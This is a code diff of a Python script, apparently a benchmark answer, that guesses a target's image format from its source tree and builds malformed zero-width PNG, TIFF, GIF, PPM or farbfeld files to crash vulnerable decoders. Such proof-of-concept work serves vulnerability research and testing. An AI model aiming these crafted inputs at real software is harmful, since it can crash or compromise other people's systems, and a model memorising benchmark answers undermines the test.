@@ -1,208 +1,253 @@
 import os
 import re
-import tarfile
+import io
 import struct
-import binascii
+import tarfile
+import tempfile
 import zlib
-from typing import Dict, Tuple, Optional
+from typing import Dict, Iterable, Tuple, Optional
+
+
+def _read_text_snippet_from_file(path: str, limit: int = 262144) -> str:
+    try:
+        with open(path, "rb") as f:
+            data = f.read(limit)
+        return data.decode("utf-8", errors="ignore").lower()
+    except Exception:
+        return ""
+
+
+def _read_text_snippet_from_tar_member(t: tarfile.TarFile, m: tarfile.TarInfo, limit: int = 262144) -> str:
+    try:
+        f = t.extractfile(m)
+        if f is None:
+            return ""
+        data = f.read(limit)
+        return data.decode("utf-8", errors="ignore").lower()
+    except Exception:
+        return ""
+
+
+def _png_chunk(typ: bytes, data: bytes) -> bytes:
+    crc = zlib.crc32(typ)
+    crc = zlib.crc32(data, crc) & 0xFFFFFFFF
+    return struct.pack(">I", len(data)) + typ + data + struct.pack(">I", crc)
+
+
+def _make_png_zero_width(height: int = 64) -> bytes:
+    height = max(1, int(height))
+    sig = b"\x89PNG\r\n\x1a\n"
+    ihdr = struct.pack(">I", 0) + struct.pack(">I", height) + bytes([8, 2, 0, 0, 0])
+    # For width=0, rowbytes=0, each scanline still has 1 filter byte => decompressed size == height
+    raw = b"\x00" * height
+    idat = zlib.compress(raw, 9)
+    return sig + _png_chunk(b"IHDR", ihdr) + _png_chunk(b"IDAT", idat) + _png_chunk(b"IEND", b"")
+
+
+def _make_tiff_zero_width(height: int = 1, bytecount: int = 32) -> bytes:
+    height = max(1, int(height))
+    bytecount = max(1, int(bytecount))
+
+    # Little-endian TIFF
+    header = b"II" + struct.pack("<H", 42) + struct.pack("<I", 8)
+
+    entries = []
+    # (tag, type, count, value_or_offset)
+    # types: 3=SHORT, 4=LONG
+    entries.append((256, 4, 1, 0))          # ImageWidth = 0
+    entries.append((257, 4, 1, height))     # ImageLength
+    entries.append((258, 3, 1, 8))          # BitsPerSample = 8
+    entries.append((259, 3, 1, 1))          # Compression = none
+    entries.append((262, 3, 1, 2))          # PhotometricInterpretation = RGB
+    entries.append((277, 3, 1, 3))          # SamplesPerPixel = 3
+    entries.append((278, 4, 1, height))     # RowsPerStrip
+    entries.append((279, 4, 1, bytecount))  # StripByteCounts (non-zero)
+    entries.append((284, 3, 1, 1))          # PlanarConfiguration = chunky
+
+    entries.sort(key=lambda x: x[0])
+
+    n = len(entries) + 1  # + StripOffsets
+    ifd_size = 2 + n * 12 + 4
+    data_offset = 8 + ifd_size
+
+    entries.append((273, 4, 1, data_offset))  # StripOffsets
+    entries.sort(key=lambda x: x[0])
+
+    ifd = struct.pack("<H", len(entries))
+    for tag, typ, count, val in entries:
+        if typ == 3 and count == 1:
+            value_field = struct.pack("<H", val & 0xFFFF) + b"\x00\x00"
+        else:
+            value_field = struct.pack("<I", val & 0xFFFFFFFF)
+        ifd += struct.pack("<H", tag) + struct.pack("<H", typ) + struct.pack("<I", count) + value_field
+    ifd += struct.pack("<I", 0)  # next IFD offset
+
+    pixel = b"\x00" * bytecount
+    return header + ifd + pixel
+
+
+def _gif_pack_lzw_codes(codes: Iterable[int], min_code_size: int) -> bytes:
+    # GIF LZW: codes packed LSB-first, starting code size = min_code_size + 1
+    code_size = min_code_size + 1
+    bitbuf = 0
+    bitcount = 0
+    out = bytearray()
+    for c in codes:
+        bitbuf |= (c & ((1 << code_size) - 1)) << bitcount
+        bitcount += code_size
+        while bitcount >= 8:
+            out.append(bitbuf & 0xFF)
+            bitbuf >>= 8
+            bitcount -= 8
+    if bitcount:
+        out.append(bitbuf & 0xFF)
+    return bytes(out)
+
+
+def _make_gif_zero_width(height: int = 1) -> bytes:
+    height = max(1, int(height))
+
+    header = b"GIF89a"
+    # Logical Screen Descriptor: width=0, height=1, GCT flag set, size=2 colors
+    lsd = struct.pack("<HHBBB", 0, 1, 0x80 | 0x00, 0, 0)
+    gct = b"\x00\x00\x00\xff\xff\xff"
+
+    # Image Descriptor: width=0, height=height
+    img_desc = b"\x2C" + struct.pack("<HHHHB", 0, 0, 0, height, 0)
+    min_code_size = 2
+    clear = 1 << min_code_size
+    end = clear + 1
+
+    # Minimal stream: clear, end
+    lzw = _gif_pack_lzw_codes([clear, end], min_code_size)
+    # Sub-block(s)
+    if len(lzw) == 0:
+        blocks = b"\x00"
+    else:
+        blocks = bytes([len(lzw)]) + lzw + b"\x00"
+
+    trailer = b"\x3B"
+    return header + lsd + gct + img_desc + bytes([min_code_size]) + blocks + trailer
+
+
+def _make_ppm_zero_width() -> bytes:
+    # P6 binary PPM with width=0 height=1; include 3 bytes to stress decoders that still read pixel data.
+    return b"P6\n0 1\n255\n" + b"\x00\x00\x00"
+
+
+def _make_farbfeld_zero_width() -> bytes:
+    # farbfeld: 8-byte magic + width+height (u32be) + pixel data (8 bytes per pixel)
+    # width=0 height=1 but include a pixel to stress decoders.
+    return b"farbfeld" + struct.pack(">II", 0, 1) + (b"\x00" * 8)
+
+
+def _detect_format_from_source(src_path: str) -> str:
+    scores: Dict[str, int] = {
+        "png": 0,
+        "tiff": 0,
+        "gif": 0,
+        "jpeg": 0,
+        "webp": 0,
+        "bmp": 0,
+        "pnm": 0,
+        "farbfeld": 0,
+    }
+
+    fmt_keywords: Dict[str, Tuple[str, ...]] = {
+        "png": ("png", "ihdr", "idat", "iout", "spng_", "libpng", "lodepng", "stb_image"),
+        "tiff": ("tiff", "tiffio", "libtiff", "tif_"),
+        "gif": ("gif", "giflib", "dgif", "egif", "gif_lib.h"),
+        "jpeg": ("jpeg", "jpeglib", "libjpeg", "tjinit", "turbojpeg"),
+        "webp": ("webp", "vp8", "vp8l", "vp8x"),
+        "bmp": ("bmp", "bitmap", "dib", "bitmapinfoheader"),
+        "pnm": ("pnm", "ppm", "pgm", "pbm", "pam", "p6\n", "p5\n"),
+        "farbfeld": ("farbfeld",),
+    }
+
+    code_exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".rs", ".py", ".go", ".java")
+    max_member_size = 2 * 1024 * 1024
+
+    def bump_by_name(name_l: str) -> None:
+        for fmt, kws in fmt_keywords.items():
+            for kw in kws:
+                if kw in name_l:
+                    scores[fmt] += 3
+
+    def bump_by_text(txt: str) -> None:
+        if not txt:
+            return
+        for fmt, kws in fmt_keywords.items():
+            inc = 0
+            for kw in kws:
+                if kw and kw in txt:
+                    inc += txt.count(kw)
+            if inc:
+                scores[fmt] += inc
+
+        # Fuzzer entrypoint suggests OSS-Fuzz usage; just a hint for image parsing.
+        if "llvmfuzzertestoneinput" in txt:
+            scores["png"] += 1
+            scores["tiff"] += 1
+            scores["gif"] += 1
+            scores["jpeg"] += 1
+            scores["webp"] += 1
+            scores["bmp"] += 1
+            scores["pnm"] += 1
+            scores["farbfeld"] += 1
+
+    if os.path.isdir(src_path):
+        for root, _, files in os.walk(src_path):
+            for fn in files:
+                name_l = fn.lower()
+                bump_by_name(name_l)
+                if name_l.endswith(code_exts):
+                    p = os.path.join(root, fn)
+                    try:
+                        st = os.stat(p)
+                        if st.st_size > max_member_size:
+                            continue
+                    except Exception:
+                        continue
+                    bump_by_text(_read_text_snippet_from_file(p))
+    else:
+        try:
+            with tarfile.open(src_path, "r:*") as t:
+                for m in t.getmembers():
+                    name_l = m.name.lower()
+                    bump_by_name(name_l)
+                    if not m.isreg():
+                        continue
+                    if m.size > max_member_size:
+                        continue
+                    if name_l.endswith(code_exts) or "fuzz" in name_l or "fuzzer" in name_l:
+                        bump_by_text(_read_text_snippet_from_tar_member(t, m))
+        except Exception:
+            return "png"
+
+    # Tie-breaking preference: png > tiff > gif > pnm > farbfeld > jpeg > webp > bmp
+    order = ["png", "tiff", "gif", "pnm", "farbfeld", "jpeg", "webp", "bmp"]
+    best = order[0]
+    best_score = scores.get(best, 0)
+    for fmt in order[1:]:
+        sc = scores.get(fmt, 0)
+        if sc > best_score:
+            best = fmt
+            best_score = sc
+
+    return best if best_score > 0 else "png"
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        fmt = self._detect_likely_format(src_path)
-        if fmt == "gif":
-            return self._poc_gif_w0_h1()
+        fmt = _detect_format_from_source(src_path)
+
         if fmt == "tiff":
-            return self._poc_tiff_w0_h1()
+            return _make_tiff_zero_width(height=1, bytecount=64)
+        if fmt == "gif":
+            return _make_gif_zero_width(height=64)
         if fmt == "pnm":
-            return self._poc_pnm_p6_w0_h1()
-        return self._poc_png_w0_h1()
-
-    def _detect_likely_format(self, src_path: str) -> str:
-        scores = {"png": 0, "gif": 0, "tiff": 0, "pnm": 0}
-        if os.path.isdir(src_path):
-            for root, _, files in os.walk(src_path):
-                for fn in files:
-                    p = os.path.join(root, fn)
-                    if not self._is_text_source_file(fn):
-                        continue
-                    try:
-                        if os.path.getsize(p) > 512_000:
-                            continue
-                        with open(p, "rb") as f:
-                            data = f.read()
-                    except Exception:
-                        continue
-                    self._score_text(data, fn, scores)
-            return self._pick(scores)
-
-        try:
-            with tarfile.open(src_path, "r:*") as tf:
-                total_read = 0
-                for m in tf:
-                    if not m.isfile():
-                        continue
-                    name = m.name.rsplit("/", 1)[-1]
-                    if not self._is_text_source_file(name):
-                        continue
-                    if m.size > 512_000:
-                        continue
-                    try:
-                        f = tf.extractfile(m)
-                        if f is None:
-                            continue
-                        data = f.read()
-                        total_read += len(data)
-                    except Exception:
-                        continue
-                    self._score_text(data, name, scores)
-                    if total_read > 4_000_000:
-                        break
-        except Exception:
-            return "png"
-        return self._pick(scores)
-
-    def _pick(self, scores: Dict[str, int]) -> str:
-        if scores["png"] <= 0 and scores["gif"] <= 0 and scores["tiff"] <= 0 and scores["pnm"] <= 0:
-            return "png"
-        # Prefer PNG on ties since it's most common in generic image loaders
-        order = ["png", "gif", "tiff", "pnm"]
-        best = max(order, key=lambda k: (scores[k], -order.index(k)))
-        return best
-
-    def _is_text_source_file(self, filename: str) -> bool:
-        fn = filename.lower()
-        exts = (
-            ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc",
-            ".m", ".mm", ".rs", ".go", ".java", ".kt", ".swift",
-            ".py", ".js", ".ts", ".cmake", ".txt", ".md"
-        )
-        return fn.endswith(exts) or ("fuzz" in fn and not fn.endswith((".a", ".o", ".so", ".dll", ".exe", ".png", ".gif", ".tif", ".tiff", ".jpg", ".jpeg")))
-
-    def _score_text(self, data: bytes, filename: str, scores: Dict[str, int]) -> None:
-        low = data.lower()
-        fname = filename.lower()
-
-        def add(key: str, val: int) -> None:
-            scores[key] += val
-
-        if b"llvmfuzzertestoneinput" in low:
-            add("png", 10)
-            add("gif", 6)
-            add("tiff", 6)
-            add("pnm", 4)
-
-        if b"stbi_load" in low or b"stbi__" in low or b"stb_image" in low:
-            add("png", 25)
-
-        if b"png" in low or b"ihdr" in low or b"idat" in low or b"iendl" in low:
-            add("png", 8)
-        if b"lodepng" in low or b"spng" in low or b"libpng" in low or b"png_read_info" in low:
-            add("png", 20)
-        if "png" in fname:
-            add("png", 6)
-
-        if b"gif" in low or b"gif89a" in low or b"dgifopen" in low or b"egifopen" in low:
-            add("gif", 12)
-        if "gif" in fname:
-            add("gif", 5)
-
-        if b"tiff" in low or b"libtiff" in low or b"tif" in low or b"tiffopen" in low:
-            add("tiff", 12)
-        if "tif" in fname or "tiff" in fname:
-            add("tiff", 5)
-
-        if b"ppm" in low or b"pgm" in low or b"pnm" in low or b"pbm" in low:
-            add("pnm", 10)
-        if "pnm" in fname or "ppm" in fname or "pgm" in fname or "pbm" in fname:
-            add("pnm", 4)
-
-        # Heuristic: if code explicitly references "filter byte" or unfiltering, likely PNG
-        if b"unfilter" in low or b"filter byte" in low or b"paeth" in low:
-            add("png", 12)
-
-    def _poc_png_w0_h1(self) -> bytes:
-        sig = b"\x89PNG\r\n\x1a\n"
-
-        def chunk(typ: bytes, data: bytes) -> bytes:
-            crc = binascii.crc32(typ)
-            crc = binascii.crc32(data, crc) & 0xFFFFFFFF
-            return struct.pack(">I", len(data)) + typ + data + struct.pack(">I", crc)
-
-        width = 0
-        height = 1
-        bit_depth = 8
-        color_type = 6  # RGBA
-        compression = 0
-        filter_method = 0
-        interlace = 0
-        ihdr_data = struct.pack(">IIBBBBB", width, height, bit_depth, color_type, compression, filter_method, interlace)
-
-        raw = b"\x00"  # filter byte only (rowbytes=0)
-        comp = zlib.compress(raw, 9)
-        return sig + chunk(b"IHDR", ihdr_data) + chunk(b"IDAT", comp) + chunk(b"IEND", b"")
-
-    def _poc_gif_w0_h1(self) -> bytes:
-        # Minimal GIF89a with width=0, height=1, 2-color GCT, single image, minimal LZW stream (clear+end)
-        hdr = b"GIF89a"
-        width = 0
-        height = 1
-        packed = 0b10000000  # GCT present, color resolution 0, sort 0, GCT size 2 colors
-        bg = 0
-        aspect = 0
-        lsd = struct.pack("<HHBBB", width, height, packed, bg, aspect)
-        gct = b"\x00\x00\x00" + b"\xFF\xFF\xFF"  # black, white
-        img_desc = b"\x2C" + struct.pack("<HHHHB", 0, 0, width, height, 0)
-        lzw_min = b"\x02"
-        # With min code size 2: clear=4, end=5, initial code size 3, codes: 4,5 => bits LSB-first => 0x2C
-        img_data = b"\x01" + b"\x2C" + b"\x00"
-        trailer = b"\x3B"
-        return hdr + lsd + gct + img_desc + lzw_min + img_data + trailer
-
-    def _poc_tiff_w0_h1(self) -> bytes:
-        # Minimal little-endian TIFF with width=0, height=1, uncompressed, 8bpp grayscale, 1 strip, 1 byte data.
-        # Some buggy readers may allocate based on width/height and still read/decode strip data.
-        endian = b"II"
-        magic = struct.pack("<H", 42)
-        ifd_offset = struct.pack("<I", 8)
-
-        entries = []
-
-        def tag_entry(tag: int, typ: int, count: int, value: int) -> bytes:
-            # value is placed directly if fits in 4 bytes
-            return struct.pack("<HHI", tag, typ, count) + struct.pack("<I", value)
-
-        # Types: 3=SHORT, 4=LONG
-        entries.append(tag_entry(256, 4, 1, 0))  # ImageWidth = 0
-        entries.append(tag_entry(257, 4, 1, 1))  # ImageLength = 1
-        entries.append(tag_entry(258, 3, 1, 8))  # BitsPerSample = 8
-        entries.append(tag_entry(259, 3, 1, 1))  # Compression = 1
-        entries.append(tag_entry(262, 3, 1, 1))  # PhotometricInterpretation = 1
-        # StripOffsets and StripByteCounts filled after calculating positions
-        # SamplesPerPixel, RowsPerStrip
-        entries.append(tag_entry(277, 3, 1, 1))  # SamplesPerPixel = 1
-        entries.append(tag_entry(278, 4, 1, 1))  # RowsPerStrip = 1
-
-        # We'll include StripOffsets and StripByteCounts
-        # Total IFD size: 2 + N*12 + 4
-        # We'll append the two strip-related entries at the end for stable offsets.
-        n_base = len(entries) + 2
-        ifd_size = 2 + n_base * 12 + 4
-        data_offset = 8 + ifd_size
-
-        strip_offset = data_offset
-        strip_bytecounts = 1
-
-        entries.append(tag_entry(273, 4, 1, strip_offset))      # StripOffsets
-        entries.append(tag_entry(279, 4, 1, strip_bytecounts))   # StripByteCounts
-
-        num_entries = struct.pack("<H", len(entries))
-        next_ifd = struct.pack("<I", 0)
-        ifd = num_entries + b"".join(entries) + next_ifd
-
-        pixel_data = b"\x00"
-        return endian + magic + ifd_offset + ifd + pixel_data
-
-    def _poc_pnm_p6_w0_h1(self) -> bytes:
-        # Minimal binary PPM with width=0, height=1
-        return b"P6\n0 1\n255\n"
+            return _make_ppm_zero_width()
+        if fmt == "farbfeld":
+            return _make_farbfeld_zero_width()
+        # default to PNG
+        return _make_png_zero_width(height=1024)
